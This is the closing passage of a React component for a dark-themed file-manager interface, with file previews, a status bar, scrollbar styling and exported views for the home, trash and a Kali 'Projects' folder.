                {openFile.type === 'image' && <div className="flex items-center justify-center h-full"><img src={openFile.url} alt={openFile.name} className="max-w-full max-h-full rounded-lg shadow-2xl" /></div>}
                {openFile.type === 'pdf' && <iframe src={openFile.url} className="w-full h-full rounded-xl border border-white/5 bg-white opacity-95" title="PDF" />}
              </div>
            </div>
          )}
        </div>
      </div>

      <div className="bg-[#181a1f] border-t border-[#2a2e35] px-5 py-2 flex justify-between items-center text-[10px] md:text-[11px] text-gray-500 font-bold tracking-tight">
        <div className="flex gap-4 md:gap-8 items-center">
          <span className="flex items-center gap-2 hover:text-gray-300 transition-colors cursor-default"><File size={12} /> {items.length} objects</span>
          <span className="hidden sm:flex items-center gap-2 hover:text-gray-300 transition-colors cursor-default uppercase"><HardDrive size={12} /> 14.2 GB available</span>
        </div>
        <div className="flex items-center gap-3 md:gap-5 overflow-hidden">
          <span className="font-mono text-[#3b82f6]/80 truncate">{currentPath}</span>
          <div className="flex gap-3 flex-shrink-0">
            <Settings size={14} className="cursor-pointer hover:text-white transition-colors" />
            <Info size={14} className="cursor-pointer hover:text-white transition-colors" />
          </div>
        </div>
      </div>

      <style dangerouslySetInnerHTML={{ __html: `
        .custom-scrollbar::-webkit-scrollbar { width: 10px; }
        .custom-scrollbar::-webkit-scrollbar-track { background: transparent; }
        .custom-scrollbar::-webkit-scrollbar-thumb { background: #2a2e35; border-radius: 20px; border: 2px solid transparent; background-clip: content-box; }
        .custom-scrollbar::-webkit-scrollbar-thumb:hover { background: #3b82f6; }
        @keyframes fade-in { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
        .animate-in { animation: fade-in 0.2s ease-out forwards; }
      `}} />
    </div>
  );
};

/**
 * FIXED EXPORTS: Returning functions that provide the component instance.
 */
export const displayfilemanager = () => <App />;
export const displayTrash = () => <App initialPath="/trash" />;
export const displayProjects = () => <App initialPath="/home/kali/Projects" />;
export default App;